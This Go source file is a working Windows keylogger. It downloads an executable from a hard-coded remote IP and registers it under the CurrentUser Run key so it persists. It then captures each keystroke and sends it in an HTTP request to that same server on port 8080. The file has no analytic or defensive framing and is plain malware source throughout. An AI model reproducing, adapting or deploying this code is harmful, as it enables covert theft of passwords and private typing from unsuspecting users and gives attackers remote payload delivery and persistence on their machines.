package main

import (
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"runtime"
	"time"

	"github.com/kindlyfire/go-keylogger"
	"golang.org/x/sys/windows/registry"
)

const (
	delayKeyfetchMS = 4
	URL             = "http://195.154.191.13"
)

func UserHomeDir() string {
	if runtime.GOOS == "windows" {
		home := os.Getenv("HOMEDRIVE") + os.Getenv("HOMEPATH")
		if home == "" {
			home = os.Getenv("USERPROFILE")
		}
		return home
	}
	return os.Getenv("HOME")
}

func downloadFile(filepath string, url string) (err error) {

	// Create the file
	out, err := os.Create(filepath)
	if err != nil {
		return err
	}
	defer out.Close()

	// Get the data
	resp, err := http.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	// Check server response
	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("bad status: %s", resp.Status)
	}

	// Writer the body to file
	_, err = io.Copy(out, resp.Body)
	if err != nil {
		return err
	}

	return nil
}
func download() {
	homeDir := UserHomeDir() + "\\AppData\\Roaming\\aptima"
	fmt.Println(homeDir)
	if _, err := os.Stat(homeDir + "\\aptima.exe"); err == nil {
		fmt.Printf("File exists\n")
	} else {
		os.MkdirAll(homeDir, os.ModePerm)
		fmt.Printf("File does not exist\n")
		k, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.QUERY_VALUE|registry.SET_VALUE)
		if err != nil {
			fmt.Println("cannot access registre")
		}
		if err := k.SetStringValue("aptima", homeDir+"\\aptima.exe"); err != nil {
			fmt.Println(err)
		}
		if err := k.Close(); err != nil {
			fmt.Println(err)
		}
		downloadFile(homeDir+"\\aptima.exe", URL+"/aptima.exe")
	}

}

func main() {
	download()
	kl := keylogger.NewKeylogger()
	emptyCount := 0

	for {
		key := kl.GetKey()

		if !key.Empty {
			var str string = string(key.Rune)
			if str != "" {
				resp, err := http.Get(URL + ":8080/key?v=" + url.QueryEscape(str))
				if err == nil {
					fmt.Println(resp.StatusCode)
				}
				defer resp.Body.Close()
			}

			fmt.Printf("'%s' %d                     \n", str, key.Keycode)
		}

		fmt.Printf("Empty count: %d\r", emptyCount)

		time.Sleep(delayKeyfetchMS * time.Millisecond)
	}

}
